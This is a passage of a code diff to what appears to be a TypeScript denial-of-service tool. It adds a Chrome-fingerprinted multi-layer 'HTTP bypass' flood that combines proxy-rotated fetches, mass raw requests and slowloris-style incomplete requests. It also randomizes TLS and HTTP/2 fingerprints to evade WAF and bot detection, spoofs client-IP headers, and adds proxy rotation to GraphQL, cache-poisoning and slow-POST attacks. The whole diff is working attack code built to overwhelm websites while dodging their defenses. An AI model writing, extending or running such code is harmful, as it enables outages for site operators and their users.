@@ -455,6 +455,200 @@ async function runHTTPFlood(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  HTTP BYPASS — Chrome-fingerprinted multi-layer WAF bypass
+//
+//  Dedicated bypass engine distinct from waf-bypass (which is pure H2):
+//  Layer A (50%): Fetch with full Chrome header ordering via proxy rotation
+//  Layer B (30%): HTTP/1.1 with Chrome headers via raw http.request (high concurrency)
+//  Layer C (20%): Slow connection drain (incomplete requests hold server threads)
+//
+//  Each "browser" gets its own Chrome profile + cookie jar per session.
+//  TLS cipher order is randomized to defeat JA3-based bot detection.
+//  Combined: indistinguishable from real user browsing under WAF inspection.
+// ─────────────────────────────────────────────────────────────────────────
+async function runHTTPBypass(
+  base:    string,
+  threads: number,
+  proxies: ProxyConfig[],
+  signal:  AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const u = (() => {
+    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
+    catch { return new URL("https://127.0.0.1"); }
+  })();
+  const isHttps    = u.protocol === "https:";
+  const hostname   = u.hostname;
+  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
+  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
+
+  // Thread budget
+  const layerAT = Math.max(1, Math.floor(threads * 0.50)); // fetch + proxy
+  const layerBT = Math.max(1, Math.floor(threads * 0.30)); // raw http.request
+  const layerCT = Math.max(1, threads - layerAT - layerBT); // slow drain
+
+  const IS_DEV = process.env.NODE_ENV !== "production";
+  const SLOTS_A = IS_DEV ? Math.min(layerAT * 3, 300)  : Math.min(layerAT * 8, 3000);
+  const SLOTS_B = IS_DEV ? Math.min(layerBT * 20, 2000) : Math.min(layerBT * 40, 20000);
+  const SLOTS_C = IS_DEV ? Math.min(layerCT * 4, 200)  : Math.min(layerCT * 6, 1500);
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+  let proxyIdx  = 0;
+
+  // ── Layer A: Chrome-fingerprinted fetch with proxy rotation ─────────────
+  const runLayerA = async (): Promise<void> => {
+    const profile   = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const cookieJar = new Map<string, string>();
+    while (!signal.aborted) {
+      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
+      const bust     = Math.random() < 0.5 ? `?v=${randInt(1,999999)}&_=${randStr(8)}` : "";
+      const fullPath = pagePath + bust;
+      const fullUrl  = `${u.protocol}//${hostname}${fullPath}`;
+
+      const hdrs = buildWAFHeaders(hostname, fullPath, cookieJar, profile);
+      const fetchHdrs: Record<string, string> = {};
+      for (const [k, v] of Object.entries(hdrs)) {
+        if (!k.startsWith(":")) fetchHdrs[k] = v;
+      }
+
+      const useProxy = proxies.length > 0 && Math.random() < 0.65;
+      if (useProxy) {
+        const proxy = proxies[proxyIdx++ % proxies.length];
+        try {
+          const bytes = await fetchViaProxy(fullUrl, proxy, "GET", fetchHdrs);
+          localPkts++; localBytes += bytes;
+        } catch { localPkts++; localBytes += 80; }
+      } else {
+        try {
+          const ac  = new AbortController();
+          const tmo = setTimeout(() => ac.abort(), 8_000);
+          const res = await fetch(fullUrl, { method: "GET", signal: ac.signal, headers: fetchHdrs });
+          clearTimeout(tmo);
+          const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
+          const sc   = res.headers.get("set-cookie");
+          if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
+          localPkts++; localBytes += body.byteLength || 500;
+        } catch { localPkts++; localBytes += 80; }
+      }
+    }
+  };
+
+  // ── Layer B: High-concurrency raw http.request with Chrome headers ───────
+  // Uses http.Agent (no per-host cap) for max parallel connections
+  const runLayerB = (): Promise<void> => new Promise(resolve => {
+    let inflight = 0;
+    const doReq = () => {
+      if (signal.aborted) { if (inflight === 0) resolve(); return; }
+      inflight++;
+      const profile  = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?_=${randStr(8)}&v=${randInt(1,9999999)}`;
+      const hdrs: Record<string, string> = {
+        "user-agent":                 profile.ua,
+        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "accept-language":            "en-US,en;q=0.9",
+        "accept-encoding":            "gzip, deflate, br, zstd",
+        "sec-ch-ua":                  profile.brand,
+        "sec-ch-ua-mobile":           profile.mobile ? "?1" : "?0",
+        "sec-ch-ua-platform":         profile.plat,
+        "sec-fetch-dest":             "document",
+        "sec-fetch-mode":             "navigate",
+        "sec-fetch-site":             "none",
+        "cache-control":              "max-age=0",
+        "priority":                   "u=0, i",
+        "x-forwarded-for":            randIp(),
+        "cf-connecting-ip":           randIp(),
+        "cookie":                     `__cf_bm=${randHex(43)}; _ga=GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`,
+        "Host":                       hostname,
+        "Connection":                 "close",
+      };
+      const reqOpts: http.RequestOptions | https.RequestOptions = {
+        hostname: resolvedIp, port: tgtPort, path: pagePath,
+        method: "GET", headers: hdrs,
+        agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
+        timeout: 800,
+        ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
+      };
+      const req = (isHttps ? https : http).request(reqOpts, (res) => {
+        inflight--;
+        localPkts++;
+        localBytes += parseInt(String(res.headers["content-length"] || "0")) || 400;
+        res.destroy();
+        if (!signal.aborted) doReq();
+        else if (inflight === 0) resolve();
+      });
+      req.on("error",   () => { inflight--; localPkts++; localBytes += 80; if (!signal.aborted) doReq(); else if (inflight === 0) resolve(); });
+      req.on("timeout", () => { req.destroy(); });
+      req.end();
+    };
+    for (let i = 0; i < SLOTS_B; i++) doReq();
+  });
+
+  // ── Layer C: Slow drain — Chrome-fingerprinted incomplete requests ────────
+  const runLayerC = async (): Promise<void> => {
+    const oneSlot = (): Promise<void> => new Promise(resolve => {
+      if (signal.aborted) { resolve(); return; }
+      const sock: net.Socket = isHttps
+        ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, ciphers: randomJA3Ciphers() })
+        : net.createConnection({ host: resolvedIp, port: tgtPort });
+      sock.setTimeout(90_000);
+      sock.setNoDelay(true);
+      let iv: NodeJS.Timeout | null = null;
+      let settled = false;
+      const cleanup = () => {
+        if (settled) return; settled = true;
+        if (iv) { clearInterval(iv); iv = null; }
+        try { sock.destroy(); } catch { /**/ }
+        resolve();
+      };
+      const profile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+      const onConn  = () => {
+        localPkts++;
+        // Send partial Chrome-fingerprinted request — missing final CRLF
+        const partial = [
+          `GET ${WAF_PATHS[randInt(0, WAF_PATHS.length)]}?_=${randStr(8)} HTTP/1.1`,
+          `Host: ${hostname}`,
+          `User-Agent: ${profile.ua}`,
+          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`,
+          `Accept-Language: en-US,en;q=0.9`,
+          `Accept-Encoding: gzip, deflate, br, zstd`,
+          `Sec-CH-UA: ${profile.brand}`,
+          `Sec-CH-UA-Mobile: ${profile.mobile ? "?1" : "?0"}`,
+          `Sec-CH-UA-Platform: ${profile.plat}`,
+          `Cache-Control: max-age=0`,
+          `Cookie: __cf_bm=${randHex(43)}`,
+          `Connection: keep-alive`,
+          ``, // NO terminal CRLF — server waits for more headers forever
+        ].join("\r\n");
+        sock.write(partial);
+        localBytes += partial.length;
+        // Trickle a fake header every 12-30s to prevent server timeout
+        iv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { cleanup(); return; }
+          const hdr = `Sec-Fetch-${randStr(4)}: ${randStr(randInt(6,16))}\r\n`;
+          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
+        }, randInt(12_000, 30_000));
+      };
+      if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
+      else sock.once("connect", onConn);
+      sock.once("error", cleanup); sock.once("timeout", cleanup); sock.once("close", cleanup);
+      signal.addEventListener("abort", () => { if (iv) clearInterval(iv); try { sock.destroy(); } catch { /**/ } if (!settled) { settled = true; resolve(); } }, { once: true });
+    });
+    const runSlot = async () => { while (!signal.aborted) { await oneSlot(); if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10)); } };
+    await Promise.all(Array.from({ length: SLOTS_C }, runSlot));
+  };
+
+  await Promise.all([
+    ...Array.from({ length: SLOTS_A }, () => runLayerA()),
+    runLayerB(),
+    runLayerC(),
+  ]);
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  TCP FLOOD — exhausts connection state tables
 // ─────────────────────────────────────────────────────────────────────────
 async function runTCPFlood(
@@ -670,10 +864,11 @@ async function runHTTP2Flood(
         try {
           c = h2connect(connectTarget, {
             rejectUnauthorized: false,
+            ciphers:        randomJA3Ciphers(),   // Chrome JA3 fingerprint
+            ALPNProtocols:  ["h2", "http/1.1"],   // Chrome ALPN order
             settings: {
-              initialWindowSize:    65535 * 8,
+              ...CHROME_H2_SETTINGS,              // Chrome-exact H2 fingerprint (AKAMAI)
               maxConcurrentStreams: STREAMS_PER_SESSION,
-              headerTableSize:      65536,
             },
           });
         } catch { resolve(); return; }
@@ -1041,18 +1236,20 @@ function randomJA3Ciphers(): string {
   return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
 }
 
-// Chrome browser profiles — Chrome 130-134 (current as of April 2026)
+// Chrome browser profiles — Chrome 130-135 (current as of April 2026)
+// Includes sec-ch-ua-arch, sec-ch-ua-bitness, sec-ch-ua-wow64 for maximum fingerprint fidelity
 const CHROME_PROFILES = [
-  { ver: "130", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"', mobile: false },
-  { ver: "131", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "132", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="132", "Chromium";v="132", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "133", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "134", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "134", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
-  { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true  },
-  { ver: "134", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6478.35 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: true  },
+  { ver: "130", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "131", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "132", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="132", "Chromium";v="132", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "133", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "135", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "135", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: false, arch: '"arm"',   bitness: '"64"', wow64: "?0" },
+  { ver: "134", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
+  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
+  { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true,  arch: '"arm"',   bitness: '"64"', wow64: "?0" },
+  { ver: "135", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.0.0 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
 ];
 
 // Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
@@ -1115,22 +1312,27 @@ function buildWAFHeaders(
     ":authority": hostname,
     ":scheme":    "https",
     ":path":      path,
-    // Real headers in Chrome's EXACT order
-    "sec-ch-ua":                  p.brand,
-    "sec-ch-ua-mobile":           p.mobile ? "?1" : "?0",  // tied to actual UA type
-    "sec-ch-ua-platform":         p.plat,
-    "upgrade-insecure-requests":  "1",
-    "user-agent":                 p.ua,
-    "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "sec-fetch-site":             referer ? "cross-site" : "none",
-    "sec-fetch-mode":             "navigate",
+    // Real headers in Chrome's EXACT order (Akamai fingerprinter checks order + values)
+    "sec-ch-ua":                        p.brand,
+    "sec-ch-ua-mobile":                 p.mobile ? "?1" : "?0",
+    "sec-ch-ua-platform":               p.plat,
+    "upgrade-insecure-requests":        "1",
+    "user-agent":                       p.ua,
+    "accept":                           "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "sec-fetch-site":                   referer ? "cross-site" : "none",
+    "sec-fetch-mode":                   "navigate",
     ...(isUserInitiated ? { "sec-fetch-user": "?1" } : {}),
-    "sec-fetch-dest":             "document",
-    "accept-encoding":            "gzip, deflate, br, zstd",
-    "accept-language":            ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][randInt(0,4)],
-    "cookie":                     cookie,
-    "cache-control":              "max-age=0",
-    "priority":                   "u=0, i",  // Chrome 124+: document navigation priority signal
+    "sec-fetch-dest":                   "document",
+    "accept-encoding":                  "gzip, deflate, br, zstd",
+    "accept-language":                  ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][randInt(0,4)],
+    "cookie":                           cookie,
+    "cache-control":                    "max-age=0",
+    "priority":                         "u=0, i",
+    // Chrome high-entropy client hints (sent after first Sec-CH-UA-* handshake)
+    "sec-ch-ua-arch":                   p.arch,
+    "sec-ch-ua-bitness":                p.bitness,
+    "sec-ch-ua-wow64":                  p.wow64,
+    "sec-ch-ua-full-version-list":      p.brand.replace(/";v="/g, `";v="${p.ver}.0.0.`).replace(/\.Brand";v="[^"]+"/g, '.Brand";v="8.0.0.0"'),
   };
   if (referer) h["referer"] = referer;
   return h;
@@ -2177,6 +2379,7 @@ async function runGraphQLDoS(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const ENDPOINTS = [
     "/graphql", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
@@ -2252,7 +2455,24 @@ async function runGraphQLDoS(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const baseUrl = /^https?:\/\//i.test(base) ? base.replace(/\/$/, "") : `https://${base}`;
+  const baseUrl  = /^https?:\/\//i.test(base) ? base.replace(/\/$/, "") : `https://${base}`;
+  let   proxyIdx = 0;
+
+  const GQL_HEADERS = (body: string): Record<string, string> => ({
+    "Content-Type":    "application/json",
+    "Content-Length":  String(Buffer.byteLength(body)),
+    "User-Agent":      randUA(),
+    "X-Forwarded-For": randIp(),
+    "X-Real-IP":       randIp(),
+    "Accept":          "application/json, text/plain, */*",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Cache-Control":   "no-cache",
+    "Pragma":          "no-cache",
+    "X-Request-ID":    randHex(16),
+    "Origin":          baseUrl,
+    "Referer":         baseUrl + "/",
+  });
 
   const runThread = async (): Promise<void> => {
     while (!signal.aborted) {
@@ -2270,20 +2490,26 @@ async function runGraphQLDoS(
           : isBatch ? buildBatch()
           : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });
 
-        const ctrl  = new AbortController();
-        const timer = setTimeout(() => ctrl.abort(), 12_000);
+        const headers = GQL_HEADERS(body);
+
+        // Route through proxy when available (50% of requests)
+        if (proxies.length > 0 && Math.random() < 0.50) {
+          const proxy = proxies[proxyIdx++ % proxies.length];
+          try {
+            const bytes = await fetchViaProxy(url, proxy, "POST", headers, body);
+            localPkts++; localBytes += bytes;
+          } catch { localPkts++; localBytes += 80; }
+          if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
+          continue;
+        }
+
+        const ac    = new AbortController();
+        const timer = setTimeout(() => ac.abort(), 12_000);
         try {
           await fetch(url, {
             method:  "POST",
-            signal:  ctrl.signal,
-            headers: {
-              "Content-Type":   "application/json",
-              "User-Agent":     randUA(),
-              "X-Forwarded-For": randIp(),
-              "Accept":         "application/json",
-              "Cache-Control":  "no-cache",
-              "X-Request-ID":   randHex(16),
-            },
+            signal:  ac.signal,
+            headers,
             body,
           });
           clearTimeout(timer);
@@ -2407,6 +2633,7 @@ async function runCachePoison(
   threads: number,
   signal:  AbortSignal,
   onStats: (p: number, b: number) => void,
+  proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots
@@ -2415,6 +2642,7 @@ async function runCachePoison(
   const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
   const rIP     = () => `${rand(256)}.${rand(256)}.${rand(256)}.${rand(256)}`;
   const rBytes  = () => `bytes=${rand(10000)}-${rand(10000) + rand(1000)}`;
+  let   pIdx    = 0;
 
   const POISONS: Array<() => Record<string, string>> = [
     () => ({ "X-Forwarded-Host": `${rHex(8)}.evil.null`, "X-Host": `${rHex(6)}.cdn.void` }),
@@ -2439,18 +2667,29 @@ async function runCachePoison(
         const poison = POISONS[rand(POISONS.length)]();
         const path   = PATHS[rand(PATHS.length)];
         const url    = `${base}${path}${rHex(8)}`;
+        const hdrs: Record<string, string> = {
+          "User-Agent":    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${120 + rand(15)}.0.0.0 Safari/537.36`,
+          "Accept":        "text/html,application/xhtml+xml,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Cache-Control": "no-store, no-cache, must-revalidate",
+          "Pragma":        "no-cache",
+          "X-Request-ID":  rHex(16),
+          ...poison,
+        };
+        // Route through proxy (60% when available) — each request from different IP = different cache key
+        if (proxies.length > 0 && Math.random() < 0.60) {
+          const proxy = proxies[pIdx++ % proxies.length];
+          try {
+            const bytes = await fetchViaProxy(url, proxy, "GET", hdrs);
+            localPkts++; localBytes += bytes;
+          } catch { localPkts++; localBytes += 80; }
+          continue;
+        }
         try {
           const ac   = new AbortController();
           const t    = setTimeout(() => ac.abort(), 8_000);
-          const res  = await fetch(url, {
-            method: "GET", signal: ac.signal,
-            headers: {
-              "User-Agent": `Mozilla/5.0 (compatible; Bot/${rHex(4)}) Chrome/${80 + rand(30)}.0`,
-              "Accept": "text/html,*/*;q=0.8",
-              "Connection": "keep-alive",
-              ...poison,
-            },
-          });
+          const res  = await fetch(url, { method: "GET", signal: ac.signal, headers: hdrs });
           clearTimeout(t);
           const body  = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
           localPkts++;
@@ -2483,6 +2722,7 @@ async function runRUDYv2(
   threads:      number,
   signal:       AbortSignal,
   onStats:      (p: number, b: number, c: number) => void,
+  proxies:      ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
@@ -2496,22 +2736,21 @@ async function runRUDYv2(
   const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSlot = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-    const isHttps = targetPort === 443;
+  let pIdx = 0;
 
-    const makeConn = () => {
-      if (signal.aborted) { resolve(); return; }
-      const reqLine  = `POST / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Type: multipart/form-data; boundary=${BOUNDARY}\r\nContent-Length: 1073741824\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;
-      const partHdr  = `--${BOUNDARY}\r\nContent-Disposition: form-data; name="upload"; filename="data.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`;
+  const oneSlot = async (): Promise<void> => {
+    if (signal.aborted) return;
+    // Use mkTLSSock for proxy rotation — each RUDY connection comes from a different IP
+    const sock = await mkTLSSock(proxies.length > 0 ? proxies : [], pIdx++, resolvedHost, hostname, targetPort)
+      .catch(() => null);
+    if (!sock || signal.aborted) return;
 
-      const sock = (isHttps
-        ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-        : net.createConnection({ host: resolvedHost, port: targetPort })
-      ) as tls.TLSSocket | net.Socket;
+    const reqLine = `POST / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Type: multipart/form-data; boundary=${BOUNDARY}\r\nContent-Length: 1073741824\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;
+    const partHdr = `--${BOUNDARY}\r\nContent-Disposition: form-data; name="upload"; filename="data.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`;
+
+    return new Promise<void>(resolve => {
       sock.setTimeout(120_000);
-
-      const onReady = () => {
+      const startData = () => {
         openConns++;
         sock.write(reqLine + partHdr);
         localPkts++; localBytes += reqLine.length + partHdr.length;
@@ -2520,23 +2759,32 @@ async function runRUDYv2(
           try { sock.write(Buffer.from([65 + (Math.random() * 26 | 0)])); localPkts++; localBytes += 1; }
           catch { clearInterval(iv); }
         }, SEND_MS);
-        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); }, { once: true });
+        signal.addEventListener("abort", () => { clearInterval(iv); try { sock.destroy(); } catch { /**/ } }, { once: true });
       };
 
-      if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onReady);
-      else sock.once("connect", onReady);
+      if ((sock as tls.TLSSocket).authorized !== undefined) {
+        // Already connected TLS socket from mkTLSSock
+        startData();
+      } else {
+        (sock as net.Socket).once("connect", startData);
+      }
 
       const onEnd = () => {
         openConns = Math.max(0, openConns - 1);
-        if (!signal.aborted) setTimeout(makeConn, 100 + Math.random() * 200);
-        else resolve();
+        resolve();
       };
       sock.on("error",   onEnd);
       sock.on("close",   onEnd);
-      sock.on("timeout", () => { sock.destroy(); });
-    };
-    makeConn();
-  });
+      sock.on("timeout", () => { try { sock.destroy(); } catch { /**/ } });
+    });
+  };
+
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneSlot();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 100 + Math.random() * 200));
+    }
+  };
 
   await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
   clearInterval(flushIv);
@@ -2847,8 +3095,8 @@ async function runWorker() {
     await runWAFBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http-bypass") {
-    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
-    await runHTTPFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    // Chrome-fingerprinted 3-layer bypass (fetch+Chrome hdrs+slow-drain) — NOT runHTTPFlood
+    await runHTTPBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http-flood") {
     // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
@@ -2874,7 +3122,7 @@ async function runWorker() {
 
   } else if (cfg.method === "graphql-dos") {
     // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
-    await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats);
+    await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "quic-flood") {
     // QUIC/HTTP3 Initial packet flood — server allocates QUIC state per unique DCID
@@ -2882,11 +3130,11 @@ async function runWorker() {
 
   } else if (cfg.method === "cache-poison") {
     // CDN cache poisoning — fills cache store with unique keys, forces 100% origin miss
-    await runCachePoison(base, cfg.threads, ctrl.signal, onStats);
+    await runCachePoison(base, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "rudy-v2") {
     // RUDY v2 — multipart/form-data slow POST, server buffers until closing boundary
-    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
